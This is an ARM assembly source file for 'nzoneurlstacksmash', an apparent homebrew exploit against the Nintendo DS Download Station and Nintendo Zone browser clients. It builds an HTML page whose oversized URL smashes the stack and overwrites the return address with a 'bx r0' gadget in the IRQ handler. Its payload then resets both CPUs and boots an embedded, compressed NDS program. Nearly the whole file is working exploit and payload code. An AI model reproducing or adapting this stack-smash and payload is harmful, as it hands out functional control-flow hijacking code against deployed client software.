/*
nzoneurlstacksmash is licensed under the MIT license:
Copyright (c) 2010 yellowstar6

Permission is hereby granted, free of charge, to any person obtaining a copy of this
software and associated documentation files (the Software), to deal in the Software
without restriction, including without limitation the rights to use, copy, modify, merge,
publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons
to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies
or substantial portions of the Software.

THE SOFTWARE IS PROVIDED AS IS, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE
FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR
OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
DEALINGS IN THE SOFTWARE.
*/

/* EEPROM writing code is based on EEPROM code from WinterMute's cookhack. The eeprom_write procedure is compatible with only EEPROM type 2. */

/* nzoneurlstacksmash v0.1 */

.arch armv5te
.fpu softvfp
.eabi_attribute 23, 1
.eabi_attribute 24, 1
.eabi_attribute 25, 1
.eabi_attribute 26, 1
.eabi_attribute 30, 2
.eabi_attribute 18, 4

.global _start

#define	REG_BASE	0x04000000

.incbin	"overflow.html"
.incbin "urloverflow"
@ The below are the addresses of the 'bx r0' instruction in the IRQ handler. This is the address that overwrites LR on the stack.
#if defined(DS_STATION)
.word 0x01ffb550 @ NTR SDK address
#endif

#if defined(NZONE)
.word 0x01ff8104 @ TWL SDK address
#endif

.ascii "ppp"
.byte 0x22 @ The '"' character.

/*
#if defined(DS_STATION)
#define BOOTSIGNAL 0x027ffdff
#define NDSHEADER 0x027ffe00
#endif

#if defined(NZONE)
#define BOOTSIGNAL 0x02fffdff
#define NDSHEADER 0x02fffe00
#endif
*/

_start:
.arm
sub r7, pc, #8
ldr r0, =0x8278
sub r7, r7, r0
@ r7 = address of this exploit payload. When accessing data in this payload, the addr of the label is loaded, and is then added with r7. The constant r7 is subtracted by is the offset of the payload in the html. RAM addresses in this exploit are currently for the DS Station binary.(With gcc, the code is based at 0x8000, not 0x0 like as.)
mov r0, #0
ldr r8, =0x04000208
str r0, [r8]	@ REG_IME = 0;
mov r0, pc
add r0, r0, #13
bx r0

.pool
.align 2

.thumb
bl bootstrap

mov r1, r8
mov r0, #0
str r0, [r1] @ REG_IME = 0;

forever:
b	forever

.pool
.align 2

bootstrap:
push {lr}
bl resetArm9
bl bootstrapArm7
bl ndsloadstub_headerarm7cpy

pop {pc}

.pool
.align 2

bootstrapArm7:
push {r5, lr}
mov r5, #0
mov r6, r5
ldr r0, =0x04004000
ldrb r0, [r0]
mov r1, #3
and r0, r0, r1
cmp r0, #1
bne bootstrapArm7_dsmode
mov r5, #0x80
mov r6, #0x20
lsl r5, r5, #16
lsl r6, r6, #16
@ldr r5, =0x800000

bootstrapArm7_dsmode:
mov r0, #1
mov r1, r8
str r0, [r1] @ REG_IME = 1;
bl bootstrapArm7DSiSync

bootstrapArm7_sendipcmsg: @ Send IPC data msg 0x10<<8 on channel 12, to make Arm7 enter bootstub.
mov r0, #12
mov r1, #0x10
lsl r1, r1, #8
bl sendipcmsg
cmp r0, #0
blt bootstrapArm7_sendipcmsg

ldr r0, =0x023710a8
@ldr r0, =0x04000184
@ldr r1, =0x04100000
ipcreplywait:
ldrh r1, [r0]
cmp r1, #1
@mov r3, #0x10
@lsl r3, r3, #4
@ldrh r2, [r0]
@tst r2, r3
bne ipcreplywait

@ldr r2, [r1]
@ldr r3, =0x4000c
@cmp r2, r3
@bne ipcreplywait
@bl swiWaitForVBlank

mov r0, r8
mov r1, #0
str r1, [r0] @ REG_IME = 0;
ldr r0, =0x027e3ffc
@sub r0, r0, r6
@cmp r5, #0
@beq bootstrapArm7_irqclear_dsmode
@nop
@ldr r0, =0x02200000
@nop

bootstrapArm7_irqclear_dsmode:
str r1, [r0]

ldr r0, =0x04000180
mov r2, #0xf
bootwait1:
ldrh r1, [r0]
and r1, r1, r2
cmp r1, #1
bne bootwait1

mov r1, #0x10
lsl r1, r1, #4
strh r1, [r0]

mov r0, #0
ldr r1, =0x027ffd80
@ldr r2, =0x027ffd9c
ldr r2, =0x027ffe00
@add r1, r1, r5
@add r2, r2, r5
clearlp1:
str r0, [r1]
add r1, r1, #4
cmp r1, r2
blt clearlp1

ldr r1, =0x027fff80
ldr r2, =0x027fff98
@add r1, r1, r5
@add r2, r2, r5
clearlp2:
str r0, [r1]
add r1, r1, #4
cmp r1, r2
blt clearlp2

strh r0, [r1]
ldr r1, =0x027fff9c
ldr r2, =0x02800000
@add r1, r1, r5
@add r2, r2, r5
clearlp3:
str r0, [r1]
add r1, r1, #4
cmp r1, r2
blt clearlp3

ldr r0, =0x04000180
mov r2, #0xf
bootwait2:
ldrh r1, [r0]
and r1, r1, r2
cmp r1, #1
beq bootwait2

bl ndsloadstub

ldr r0, =0x04000180
mov r1, #0x0
strh r1, [r0]

bootstrapArm7_end:
pop {r5, pc}

.pool
.align 2

bootstrapArm7DSiSync:
ldr r0, =0x04004000
ldrb r0, [r0]
mov r1, #3
and r0, r0, r1
cmp r0, #1
bne bootstrapArm7DSiSync_end

/*
push {r5}
ldr r0, =0x02fffc24
add r1, r0, #0x2
add r2, r0, #0x4
mov r3, #0x3
strh r3, [r2]
ldrh r2, [r0]
ldrh r3, [r1]

twl_bootwait0:
add r2, r2, #1
strh r2, [r0]
ldrh r5, [r1]
cmp r5, r3
beq twl_bootwait0

ldrh r2, [r0]
ldrh r3, [r1]

twl_bootwait1:
add r2, r2, #1
strh r2, [r0]
ldrh r5, [r1]
cmp r5, r3
beq twl_bootwait1

pop {r5}
*/
nop
nop
nop
nop
nop

bootstrapArm7DSiSync_end:
bx lr

.pool
.align 2

ndsloadstub:
push {r4, r5, lr}

@ldr r4, =ndsloader
@add r4, r4, r7
@ldrb r0, [r4]
@cmp r0, #0x10
@bne ndsloadstub_skipdecom

ldr r0, =ndsloader
ldr r4, =0x02300000
add r0, r0, r7
mov r1, r4
@ldr ip, =swiDecompressLZSSVram
@add ip, ip, r7
@orr ip, ip, #1
@mov lr, pc
@bx ip
bl swiDecompressLZSSVram

@ndsloadstub_skipdecom:

@ldr r0, [r4, #0x20]
@add r0, r0, r4 @ Src Arm9 bin
@ldr r1, [r4, #0x28] @ Dest/Load Arm9 addr
@ldr r2, [r4, #0x2c] @ Arm9 bin size

@ndsloadstub_arm9cpylp:
@ldr r3, [r0]
@str r3, [r1]
@add r0, r0, #4
@add r1, r1, #4
@sub r2, r2, #4
@cmp r2, #0
@bgt ndsloadstub_arm9cpylp

@blx DC_InvalidateAll

@mov r5, #0
@ldr r1, =0x04004000
@ldr r0, =0x027ffdff
@ldrb r1, [r1]
@mov r2, #3
@and r1, r1, r2
@cmp r1, #1
@bne ndsloadstub_dsmode
@mov r5, #0x80
@lsl r5, r5, #16
@ldr r0, =0x02fffdff

@ndsloadstub_dsmode:
@ldr r5, [sp, #4]
ldr r0, =0x027ffdff
@ldreq r0, =0x02fffdff
@add r0, r0, r5
mov r1, #0
strb r1, [r0]

ldr r0, =0x04000242
mov r1, #0x80
strb r1, [r0]

ldr r0, =ndsloadstub_arm7
ldr r1, =ndsloadstub_arm7_poolend
add r0, r0, r7
add r1, r1, r7
ldr r2, =0x06840000

ndsloadstub_arm7stubcpy:
ldrh r3, [r0]
strh r3, [r2]
add r0, r0, #2
add r2, r2, #2
cmp r0, r1
blt ndsloadstub_arm7stubcpy

ldr r0, =0x04000242
mov r1, #0x82
strb r1, [r0]

ldr r1, =0x027ffe34
ldr r0, =0x06000000
str r0, [r1]

ldr r0, =arm9stub
ldr r1, =arm9stub_poolend
ldr r2, =0x023fe000
add r0, r0, r7
add r1, r1, r7

ndsloadstub_arm9stubcpy:
ldr r3, [r0]
str r3, [r2]
add r0, r0, #4
add r2, r2, #4
cmp r0, r1
blt ndsloadstub_arm9stubcpy

ldr r0, =0x023fe000
mov r1, #1
orr r0, r0, r1
bx r0

ndsloadstub_end:
pop {r4, r5, pc}

.align 2
.pool

DC_InvalidateAll:
.arm
mov r0, #0
mcr 15, 0, r0, cr7, cr6
bx lr

ndsloadstub_arm7:
mov r0, pc
add r0, r0, #5
bx r0

.thumb
@push {r5}
@mov r2, #0
@ldr r0, =0x04004000
@ldrb r0, [r0]
@mov r1, #1
@and r0, r0, r1
@cmp r0, #1
@bne ndsloadstub_arm7_dsmode
@mov r5, #0x80
@lsl r5, r5, #16

@ndsloadstub_arm7_dsmode:
ldr r4, =0x027ffdff
@add r4, r4, r5
@mov r1, #1
@strb r1, [r4]

ndsloadstub_arm7_waitlp:
ldrb r1, [r4]
cmp r1, #1
bne ndsloadstub_arm7_waitlp

/*
mov r0, #0
mov r2, r0
mov r0, r0
ldr r1, =0x04000400

ndsloadstub_arm7_soundreset:
str r2, [r1]
str r2, [r1, #4]
strh r2, [r1, #8]
str r2, [r1, #0xc]
add r1, r1, #0x10
add r0, r0, #1
cmp r0, #4
blt ndsloadstub_arm7_soundreset
ldr r1, =0x04000500
strh r2, [r1]

mov r0, #0
mov r1, r0
ldr r2, =0x040000b0
ldr r3, =0x04000100

ndsloadstub_arm7_resetlp: @ Reset DMA and timers.
str r0, [r2]
str r0, [r2, #4]
str r0, [r2, #8]
strh r0, [r3]
strh r0, [r3, #2]
add r2, r2, #0xc
add r3, r3, #4
add r1, r1, #1
cmp r1, #4
blt ndsloadstub_arm7_resetlp

mov r0, #0
ldr r1, =0x03800000
mov r2, r1
ldr r3, =0x10000
add r2, r2, r3
ldr r3, =0x8000
sub r1, r1, r3

ndsloadstub_arm7_cleariwram:
str r0, [r1]
add r1, r1, #4
cmp r1, r2
blt ndsloadstub_arm7_cleariwram

mov r1, #0
ldr r2, =0x04000210
str r1, [r2] @ REG_IE = 0;
mvn r1, r1
str r1, [r2, #4] @ REG_IF = ~0;
ldr r2, =0x04000000
sub r2, r2, #8
str r1, [r2]
mov r1, #0
str r1, [r2, #4]

ldr r2, =0x04000304
mov r1, #1
str r1, [r2] @ REG_POWCNT = 1;
*/


ldr r3, =0x02300000
ldr r0, [r3, #0x30]
add r0, r0, r3 @ Src Arm7 bin
ldr r1, [r3, #0x38] @ Dest/Load Arm7 addr
@ldr r1, =0x03000000
ldr r2, [r3, #0x3c] @ Arm7 bin size

ndsloadstub_arm7cpylp:
ldr r3, [r0]
str r3, [r1]
add r0, r0, #4
add r1, r1, #4
sub r2, r2, #4
bgt ndsloadstub_arm7cpylp

mov r1, #2
strb r1, [r4]
mov r2, #3

ldr r0, =0x04000006
ndsloadstub_arm7_vcountwait1:
ldrh r1, [r0]
cmp r1, #192
bne ndsloadstub_arm7_vcountwait1

ndsloadstub_arm7_vcountwait2:
ldrh r1, [r0]
cmp r1, #192
beq ndsloadstub_arm7_vcountwait2
strb r2, [r4]

@pop {r5}
ldr r3, =0x027ffe34
@add r0, r0, r5
ldr r0, [r3]
mov lr, r0
@mov r1, #0
@mov r2, r1
@mov r3, r1
@mov r4, r1
@mov r5, r1
@mov r6, r1
@mov r7, r1
@mov r8, r1
@mov r9, r1
@mov sl, r1
@mov ip, r1
bx r0

@.thumb
.pool
.align 2
ndsloadstub_arm7_poolend:

sendipcmsg: @ Sends a Nintendo SDK IPC msg: in_r0 = channel in_r1 = data.
ldr r2, =0x04000184 @ IPCFIFOCNT
mov r3, #0x1f
and r0, r0, r3
lsl r1, #6
orr r0, r0, r1
ldrh r1, [r2]
mov r3, #0x40
lsl r3, r3, #8
tst r1, r3
beq sendipcmsg_noerror
mov r0, #0
mvn r0, r0 @ Return -1 if the FIFO error bit is set.
bx lr

sendipcmsg_noerror:
mov r3, #2
tst r1, r3
beq sendipcmsg_notfull
mov r0, #0
mvn r0, r0 @ Return -1 if the send FIFO is full.
bx lr

sendipcmsg_notfull:
str r0, [r2, #4] @ Send the message.
mov r0, #0
bx lr

.pool
.align 2

arm9stub:
ldr r4, =0x02300000
ldr r0, [r4, #0x20]
add r0, r0, r4 @ Src Arm9 bin
ldr r1, [r4, #0x28] @ Dest/Load Arm9 addr
ldr r2, [r4, #0x2c] @ Arm9 bin size

ndsloadstub_arm9cpylp:
ldr r3, [r0]
str r3, [r1]
add r0, r0, #4
add r1, r1, #4
sub r2, r2, #4
cmp r2, #0
bgt ndsloadstub_arm9cpylp

ldr r0, =0x04000180
mov r2, #0xf
arm9stub_bootwait2:
ldrh r1, [r0]
and r1, r1, r2
cmp r1, #1
beq arm9stub_bootwait2

mov r1, #0x0
strh r1, [r0]
bl ndsloadstub_headerarm7cpy

arm9stub_forever:
b arm9stub_forever

.pool
.align 2

ndsloadstub_headerarm7cpy:
@mov r5, #0
@ldr r0, =0x04004000
@ldrb r0, [r0]
@and r0, r0, #3
@cmp r0, #1
@moveq r5, #0x800000

@ldr r0, =0x027ffdff
@ndsloadstub_headerarm7cpy_arm7stubwait:
@ldrb r1, [r0]
@cmp r1, #1
@bne ndsloadstub_headerarm7cpy_arm7stubwait

ldr r0, =0x02300000
ldr r1, =0x027ffe00
mov r2, #0x16
lsl r2, r2, #4
@add r1, r1, r5

ndsloadstub_hdrcpylp:
ldr r3, [r0]
str r3, [r1]
add r0, r0, #4
add r1, r1, #4
sub r2, r2, #4
bgt ndsloadstub_hdrcpylp

ldr r0, =0x027ffdff
mov r1, #1
strb r1, [r0]
@add r0, r0, r5

@ldr r0, =0x027ffdff
ndsloadstub_arm7wait:
ldrb r1, [r0]
cmp r1, #2
bne ndsloadstub_arm7wait

ldr r0, =0x04000006
ndsloadstub_vcountwait1:
ldrh r1, [r0]
cmp r1, #192
bne ndsloadstub_vcountwait1

ndsloadstub_vcountwait2:
ldrh r1, [r0]
cmp r1, #192
beq ndsloadstub_vcountwait2

ldr r0, =0x027ffdff
ndsloadstub_headerarm7cpy_bootwait:
ldrb r1, [r0]
cmp r1, #3
bne ndsloadstub_headerarm7cpy_bootwait

ldr r3, =0x027ffe00
@add r3, r3, r5
ldr r0, [r3, #0x24]
mov lr, r0
@ldr fp, =0x027fff80
@ldm fp, {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, sl}
@mov fp, #0
bx r0
@svc 0

bx lr

.pool
.align 2

resetArm9:
mov r0, #0
mov r1, r0
ldr r2, =0x040000b0
ldr r3, =0x04000100

resetArm9_resetlp: @ Reset DMA and timers.
str r0, [r2]
str r0, [r2, #4]
str r0, [r2, #8]
strh r0, [r3]
strh r0, [r3, #2]
add r2, r2, #0xc
add r3, r3, #4
add r1, r1, #1
cmp r1, #4
blt resetArm9_resetlp

ldr r2, =0x04000240 @ VRAM_CR = (VRAM_CR & 0xffff0000) | 0x00008080;
mov r3, r0
mvn r3, r3
lsl r3, r3, #16
ldr r1, [r2]
and r1, r1, r3
ldr r3, =0x8080
orr r1, r1, r3
str r1, [r2]

ldr r2, =0x04000000
mov r1, #0

resetArm9_maingfx_reset:
str r0, [r2, r1]
add r1, r1, #4
cmp r1, #0x56
blt resetArm9_maingfx_reset

ldr r2, =0x04001000
mov r1, #0

resetArm9_subgfx_reset:
str r0, [r2, r1]
add r1, r1, #4
cmp r1, #0x56
blt resetArm9_subgfx_reset

ldr r2, =0x04000000
str r0, [r2, #4] ; REG_DISPSTAT = 0;
str r0, [r2] ; REG_DISPCNT = 0;
mov r1, #0x10
lsl r1, r1, #8
add r2, r2, r1
str r0, [r2] ; REG_SUBDISPCNT = 0;

ldr r2, =0x04000240
strb r0, [r2]
strb r0, [r2, #1]
strb r0, [r2, #2]
strb r0, [r2, #3]
strb r0, [r2, #4]
strb r0, [r2, #5]
strb r0, [r2, #6]
strb r0, [r2, #8]
strb r0, [r2, #9]

ldr r1, =0x05000000
mov r2, #0x80
lsl r2, r2, #4

resetArm9_paletteclear:
str r0, [r1]
add r1, r1, #4
sub r2, r2, #4
bgt resetArm9_paletteclear

ldr r1, =0x07000000
mov r2, #0x80
lsl r2, r2, #4

resetArm9_oamclear:
str r0, [r1]
add r1, r1, #4
sub r2, r2, #4
bgt resetArm9_oamclear

ldr r2, =0x04000304
ldr r1, =0x820f
strh r1, [r2]
ldr r2, =0x04000247
mov r1, #0x03
strb r1, [r2]

resetArm9_end:
bx lr

.pool
.align 2
arm9stub_poolend:

/*
draw:
push {r4, r5, lr}
mov r4, r0
mov r5, r1
ldr r0, =map
add r0, r0, r7
mov r3, #0

draw_loop:
ldrb r2, [r4]
mov r1, #0xf0
and r2, r2, r1
lsr r2, r2, #4
add r2, r2, #1
strh r2, [r0]
add r0, r0, #2

ldrb r2, [r4]
mov r1, #0x0f
and r2, r2, r1
add r2, r2, #1
strh r2, [r0]
add r0, r0, #2

add r4, r4, #1
add r3, r3, #1

draw_loop_end:
cmp r3, r5
blt draw_loop

bl update_map
pop {r4, r5, pc}

.align 2
.pool

update_map:
push {r4}
ldr r0, =map
ldr r1, =0x0600f800
ldr r2, =0x0602f800
ldr r4, =map_end
add r0, r0, r7
add r4, r4, r7
mov r3, #0

map_init_loop:
cmp r0, r4
bge null_copy
ldrh r3, [r0]
add r0, r0, #2
b map_init_loop_tar_str

null_copy:
mov r3, #0

map_init_loop_tar_str:
strh r3, [r1]
add r1, r1, #2
cmp r1, r2
bne map_init_loop
pop {r4}
bx lr

.align 2
.pool

initgfx:
ldr r0, =0x040000b8
mov r1, #1
lsl r1, r1, #31
mov r3, #0

dmastop:
ldr r2, [r0]
bic r2, r2, r1
str r2, [r0]
add r0, r0, #0xc
add r3, r3, #1
cmp r3, #4
blt dmastop

ldr r0, =0x04000000
ldr r1, =0x00010160 @ 0x00010160
str r1, [r0] @ Set main display mode to 0, disable BG 1 - 3 and OBJ, enable BG0.
ldr r1, =0x1f00
strh r1, [r0, #8]
ldr r0, =0x05000000
mov r1, #0
strh r1, [r0]
mov r3, #0
mvn r1, r3
strh r1, [r0, #2]

ldr r0, =0x04000240
mov r1, #0
add r2, r0, #0x7

VRAM_Init_Loop:  @ Disable VRAM Banks A - G
strb r1, [r0]
add r0, r0, #1
cmp r0, r2
bne VRAM_Init_Loop

strb r1, [r0, #1] @ Disable VRAM Bank H
strb r1, [r0, #2] @ Disable VRAM Bank I

mov r1, #0x80
add r1, r1, #1
sub r0, r0, #7
strb r1, [r0] @ vramSetBankA(VRAM_A_MAIN_BG);
mov r1, #0
ldr r0, =0x04001000
strh r1, [r0] @ Disable the sub screen.
bx lr

.align 2
.pool

gfxcpy:
ldr r0, =0x06000000
ldr r1, =font_bin
ldr r2, =font_bin_size
add r1, r1, r7
add r2, r2, r7
ldr r2, [r2]

gfxcpy_lp:
ldrh r3, [r1]
strh r3, [r0]
add r1, #2
add r0, #2
sub r2, #2
cmp r2, #0
bgt gfxcpy_lp
bx lr

.align 2
.pool
*/

/*
eepromwait:
ldrh	r0,[r11]
tst		r0, #128
bne		eepromwait
bx	lr

.pool
.align 2

eeprom_write:
mov ip, lr
mov r5, r0
mov r6, r1
mov r7, r2
ldr r0, =0x04000204
mov r1, #0x800
ldr r2, [r0]
bic r2, r2, r1
str r2, [r0]
ldr r11, =0x040001a0

write_loop:
ldr r0, =0xa040
strh r0, [r11]
mov r0, #6
strb r0, [r11, #2]
bl eepromwait
mov r0, #0x40
strh r0, [r11]
ldr r0, =0xa040
strh r0, [r11]

mov r0, #2
strb r0, [r11, #2]
bl eepromwait
lsr r0, r7, #8
strb r0, [r11, #2]
bl eepromwait
and r0, r7, #0xff
strb r0, [r11, #2]
bl eepromwait

mov r1, #0
write_loop_eep:
ldr r2, [r5]
and r3, r2, #0xff
strb r3, [r11, #2]
bl eepromwait
lsr r3, r2, #8
and r3, r3, #0xff
strb r3, [r11, #2]
bl eepromwait
lsr r3, r2, #16
and r3, r3, #0xff
strb r3, [r11, #2]
bl eepromwait
lsr r3, r2, #24
and r3, r3, #0xff
strb r3, [r11, #2]
bl eepromwait

add r5, r5, #4
add r7, r7, #4
add r1, #4
cmp r5, r6
bge write_loop_end
cmp r1, #32
blt write_loop_eep

write_loop_end:
mov r0, #0x40
strh r0, [r11]
ldr r0, =0xa040
strh r0, [r11]
mov r0, #5bl resetArm9
strb r0, [r11, #2]
bl eepromwait

write_eep_wait_loop:
mov r0, #0
strb r0, [r11, #2]
bl eepromwait
ldrb r0, [r11, #2]
tst r0, #1
bne write_eep_wait_loop
bl eepromwait
mov r0, #0x40
strh r0, [r11]
cmp r5, r6
blt write_loop
eepromwrite_end:
bx ip

.pool
.align 2

*/

swiDecompressLZSSVram:
@.thumb
@.thumb_func
svc 0x11
bx lr

swiWaitForVBlank:
@.thumb_func
svc 0x05
bx lr

.pool
.align 2
.arm


params: @ Dummy authenication params for download function. Not used by the real server, but the client sends it.
.string "dsmac=something&apmac=appy&apnum=yeah&token=tok"

url:
.string "https://yellzone.en/ds/trial/9R3viUq2/1116984960.srl"
@ The client doesn't download the above URL directly. It downloads url.header,(replace url with the content of the above url string) and url.signature. Then, it calcuates the number of split files that need downloaded: arm9/7 binary (size / 0x3200) + 1.(200KB for each split file.)

.align 2


@Generated by BIN2S - please do not edit directly
/*	.balign 4
	.global font_bin_size
	.global font_bin
font_bin:
	.byte   0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0
	.byte   0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0
	.byte  16, 17, 17,  0, 17,  0, 17,  1, 17, 16, 17,  1, 17, 17, 16,  1
	.byte  17,  1, 16,  1, 17,  1, 16,  1, 16, 17, 17,  0,  0,  0,  0,  0
	.byte   0, 16,  1,  0,  0, 17,  1,  0, 16, 17,  1,  0,  0, 16,  1,  0
	.byte   0, 16,  1,  0,  0, 16,  1,  0, 16, 17, 17,  1,  0,  0,  0,  0
	.byte  16, 17, 17,  0, 17,  0, 16,  1,  0,  0, 16,  1,  0, 16, 17,  0
	.byte  16, 17,  0,  0, 17,  0, 16,  1, 17, 17, 17,  1,  0,  0,  0,  0
	.byte  16, 17, 17,  0, 17,  0, 16,  1,  0,  0, 16,  1,  0, 17, 17,  0
	.byte   0,  0, 16,  1, 17,  0, 16,  1, 16, 17, 17,  0,  0,  0,  0,  0
	.byte   0, 16, 17,  0,  0, 17, 17,  0, 16,  1, 17,  0, 17,  0, 17,  0
	.byte  17, 17, 17,  1,  0,  0, 17,  0,  0, 16, 17,  1,  0,  0,  0,  0
	.byte  17, 17, 17,  1, 17,  0,  0,  0, 17, 17, 17,  0,  0,  0, 16,  1
	.byte   0,  0, 16,  1, 17,  0, 16,  1, 16, 17, 17,  0,  0,  0,  0,  0
	.byte  16, 17, 17,  0, 17,  0, 16,  1, 17,  0,  0,  0, 17, 17, 17,  0
	.byte  17,  0, 16,  1, 17,  0, 16,  1, 16, 17, 17,  0,  0,  0,  0,  0
	.byte  17, 17, 17,  1, 17,  0, 16,  1,  0,  0, 17,  0,  0, 16,  1,  0
	.byte   0, 17,  0,  0,  0, 17,  0,  0,  0, 17,  0,  0,  0,  0,  0,  0
	.byte  16, 17, 17,  0, 17,  0, 16,  1, 17,  0, 16,  1, 16, 17, 17,  0
	.byte  17,  0, 16,  1, 17,  0, 16,  1, 16, 17, 17,  0,  0,  0,  0,  0
	.byte  16, 17, 17,  0, 17,  0, 16,  1, 17,  0, 16,  1, 16, 17, 17,  1
	.byte   0,  0, 16,  1, 17,  0, 16,  1, 16, 17, 17,  0,  0,  0,  0,  0
	.byte  16, 17, 17,  0, 17,  0, 16,  1, 17,  0, 16,  1, 17, 17, 17,  1
	.byte  17,  0, 16,  1, 17,  0, 16,  1, 17,  0, 16,  1,  0,  0,  0,  0
	.byte  17, 17, 17,  0, 16,  1, 16,  1, 16,  1, 16,  1, 16, 17, 17,  0
	.byte  16,  1, 16,  1, 16,  1, 16,  1, 17, 17, 17,  0,  0,  0,  0,  0
	.byte  16, 17, 17,  0, 17,  0, 16,  1, 17,  0,  0,  0, 17,  0,  0,  0
	.byte  17,  0,  0,  0, 17,  0, 16,  1, 16, 17, 17,  0,  0,  0,  0,  0
	.byte  17, 17, 17,  0, 16,  1, 16,  1, 16,  1, 16,  1, 16,  1, 16,  1
	.byte  16,  1, 16,  1, 16,  1, 16,  1, 17, 17, 17,  0,  0,  0,  0,  0
	.byte  17, 17, 17,  1, 16,  1,  0,  1, 16,  1,  1,  0, 16, 17,  1,  0
	.byte  16,  1,  1,  0, 16,  1,  0,  1, 17, 17, 17,  1,  0,  0,  0,  0
	.byte  17, 17, 17,  1, 16,  1,  0,  1, 16,  1,  1,  0, 16, 17,  1,  0
	.byte  16,  1,  1,  0, 16,  1,  0,  0, 17, 17,  0,  0,  0,  0,  0,  0

	.global font_bin_end
font_bin_end:

	.align
font_bin_size: .int 544

map:
.space 256
map_end:
*/

.align 2
original_arm7execute_addr:
.word 0

original_arm9execute_addr:
.word 0

.align 2

decomStream:
.word 0
.word 0
.word 0

load_bin:
@.incbin "bootloader/load.bin"
@.align 2
load_bin_end:

ndsloader:
@.incbin "ndswifiloader/ndswifiloader.lz"
.incbin "loadnds/loadnds.lz"
@.incbin "BootStrap/akmenu4.lz"
@.incbin "twlnand/twlnand.lz"
@.incbin "touch.lz"
@.incbin "basic_sound.lz"
@.incbin "animate_simple.lz"
@.incbin "touch_area.lz"
@.incbin "3D_Both_Screens.lz"
@.incbin "Display_List_2.lz"
@.incbin "httpget.lz"
.align 2
ndsloader_end:

original_imgsrc:
.ascii "src="
.byte 0x22
.ascii "http://yellzone.en/ds/data/dsds_logo.ntfa"
.byte 0x22
@.align 2

imgtag_end:
.byte 0x3e
end:
.byte 0x0a
.ascii "</body>"
.byte 0x0a
.ascii "</html>"
.byte 0x0a
.byte 0x0a

asm_end:
.byte 0
.align 2

